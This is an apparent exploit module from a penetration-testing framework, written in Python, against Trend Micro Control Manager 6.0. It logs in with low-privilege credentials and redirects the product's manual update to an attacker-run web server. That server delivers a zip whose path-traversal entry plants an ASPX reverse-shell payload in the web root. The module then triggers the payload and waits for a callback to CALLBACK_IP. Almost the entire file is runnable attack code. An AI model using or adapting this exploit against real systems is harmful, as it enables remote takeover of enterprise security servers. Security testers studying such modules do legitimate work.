#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import urllib2
import ssl
import md5
import hmac
import re
import base64
import socket
from zipfile import ZipFile
from collections import OrderedDict

sys.path.append('./core')
sys.path.append('./shellcodes')
import ShellUtils
import Shellcodes
from Sploit import Sploit
from WebHelper import SimpleWebServer

INFO = {}
INFO['NAME'] = "efa_trend_micro_control_manager_fu_rce"
INFO['DESCRIPTION'] = "Trend Micro Control Manager 6.0 - Authenticated File Upload"
INFO['VENDOR'] = "https://www.trendmicro.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.trendmicro.com/en_us/business/technologies/control-manager.html']
INFO["CVE Name"] = ""
INFO["NOTES"] = """Authenticated user with minimal privileges can run manual update from a fake web server which leads to remote code execution"""

INFO['CHANGELOG'] = "07 Aug, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 443, dict(description = 'Target port')
OPTIONS["SSL"] = True, dict(description = 'Use SSL')
OPTIONS["USERNAME"] = 'admin', dict(description = 'Username')
OPTIONS["PASSWORD"] = 'password', dict(description = 'Password')
OPTIONS["CALLBACK_IP"] = "192.168.1.43", dict(description = 'Callback IP')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.ssl = True
        self.username = ''
        self.password = ''
        self.callback_ip = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.ssl = self.args.get('SSL', True)
        self.port = int(self.args.get('PORT', self.port))
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
        self.username = self.args.get('USERNAME', '')
        self.password = self.args.get('PASSWORD', '')
        
        if self.ssl:
            context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
            opener = urllib2.build_opener(urllib2.HTTPSHandler(context=context))
            urllib2.install_opener(opener)
    
    def make_url(self, path = ''):
        return '{}://{}:{}{}'.format(self.prot(), self.host, self.port, path)
    
    def prot(self):
        return self.ssl and 'https' or 'http'
    
    def make_sploit(self):
        self.log("[>] Generate shellcode started")
        
        if self.args['listener']:
            port = self.args['listener']['PORT']
        else:
            return None

        s = Shellcodes.CrossOSShellcodes(self.callback_ip, port)
        shellcode = s.create_shellcode(ShellUtils.Constants.ShellcodeType.ASPX, False)

        self.log("[>] Shellcode ready")
        return shellcode
    
    def quote(self, text):
        return text.replace('/', '%2F').replace('+', '%2B').replace('=', '%3D')
    
    def getViewState(self, content):
        return self.quote(re.findall('__VIEWSTATE\" value=\"(.*)\"', content)[0])
    
    def getEventValidation(self, content):
        return self.quote(re.findall('__EVENTVALIDATION\" value=\"(.*)\"', content)[0])
    
    def encryptPassword(self, password, secret):
        return hmac.new(secret, md5.md5(password).hexdigest()).hexdigest() 
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        if self.is_listener_connected() is None:
            self.log('Please, enable listener to use this module')
            self.finish(False)
        
        aspx = self.make_sploit()
        if aspx is None:
            self.log('Please, enable listener to use this module')
            self.finish(False)
        
        #Stage1
        self.log('[*] Make .zip update file which will share via http server')
        
        path = '../../../WebUI/WebApp/east.aspx'
        zip_path = './OUTPUTS/' + INFO['NAME'] + '/ini_xml.zip'
        
        if not os.path.exists(os.path.split(zip_path)[0]):
            os.makedirs(os.path.split(zip_path)[0])
            
        with ZipFile(zip_path, 'w') as fd:
            fd.writestr(path, aspx)
        with open(zip_path, 'rb') as fd:
            zip_archive = fd.read()
        
        server = SimpleWebServer(self.callback_ip, 8000)
        server.add_file_for_share("ini_xml.zip", zip_archive)
        server.start_serve()
        self.log('[+] Web server ready on 8000 port')
        
        #Stage2
        self.log('[*] Try to log on')
        self.log('[*] Get Challenge Number ...')
        
        url = self.make_url('/WebApp/login.aspx')
        data = 'Query=ChallengeNumber'
        cookie, content = '', ''
        try:
            fd = urllib2.urlopen(url, data)
            cookie, content = fd.headers['set-cookie'].split(';')[0], fd.read()
        except Exception as e:
            self.log(e)
            self.finish(False)
            
        challengeNumber = content[16:52]
        self.log('[+] Challenge Number: ' + challengeNumber)
        self.log('[+] Cookie: ' + cookie)

        #Stage3
        epassword = self.encryptPassword(self.password, challengeNumber)
        self.log('[+] Encrypted password - ' + epassword)
        
        data = '__LASTFOCUS=&__EVENTTARGET=loginLink&__EVENTARGUMENT=&__VIEWSTATE={0}&__EVENTVALIDATION={1}&txtUserName={2}&txtPassword={3}&HidChallenge=&loginMessage='.format(self.getViewState(content), self.getEventValidation(content), self.username, epassword)
        try:
            request = urllib2.Request(url, data, headers={'Cookie':cookie})
            fd = urllib2.urlopen(request)
            if 'index.html' not in fd.geturl():
                self.log('[-] Authorization failed!')
                self.log(fd.geturl())
                self.finish(False)
        except Exception as e:
            self.log(e)
            self.finish(False)
        self.log('[+] Authorization successful!')    
        
        #Stage4
        self.log('[*] Get Login Token ... ')
        url = self.make_url('/WebApp/RedirectPage/RedirectToCCGI.aspx?pageid=2006')
        nurl = ''
        try:
            request = urllib2.Request(url, headers={'Cookie':cookie})
            fd = urllib2.urlopen(request)
            nurl = fd.geturl()
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        token = re.findall('ApInfo=(.*)node', nurl)[0]
        self.log('[+] Found Login Token: ' + token)
        
        #Stage5
        url = self.make_url('//ControlManager/cgi-bin/cgiCMUIDispatcher.exe?Page=ManualDownload/ManualDownloadResult.html&ApInfo=ApInfo=' + token)
        data = 'ID_FROM_SAVE=%24%24ID_FROM_SAVE%24%24&ID_SAVE_SUCCESSED=%24%24ID_SAVE_SUCCESSED%24%24&ID_FROM_PAGE_NAME=ID_MANUAL_DOWNLOAD_SETTING_PAGE&ID_EXPAND_INFO=&ID_PROGRAM_COM_STATUS=%24%24ID_PROGRAM_COM_STATUS%24%24&ID_MANUAL_DOWNLOAD_SOURCE=UST_FromInternetUrl&ID_MANUAL_DOWNLOAD_SOURCE_INTERNET_URL=http%3A%2F%2F{0}%3A{1}&ID_SCHEDULE_DEPLOYMENT_RADIO=DO_DoNotDeploy'.format(self.callback_ip, 8000)
        self.log('[*] Start manual update')
        try:
            request = urllib2.Request(url, data)
            fd = urllib2.urlopen(request)
        except Exception as e:
            self.log(e)
            self.finish(False)
        time.sleep(3)
        
        #Stage6
        self.log('[+] Upload successful! Execute shellcode ...')
        url = self.make_url('/WebApp/east.aspx')
        try:
            request = urllib2.Request(url, headers={'Cookie':cookie})
            urllib2.urlopen(request, timeout=3)
        except ssl.SSLError as e:
            pass
        except socket.timeout as e:
            pass
            
        while True:
            if self.is_listener_connected():
                break
            time.sleep(3)

        server.stop_serve()
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()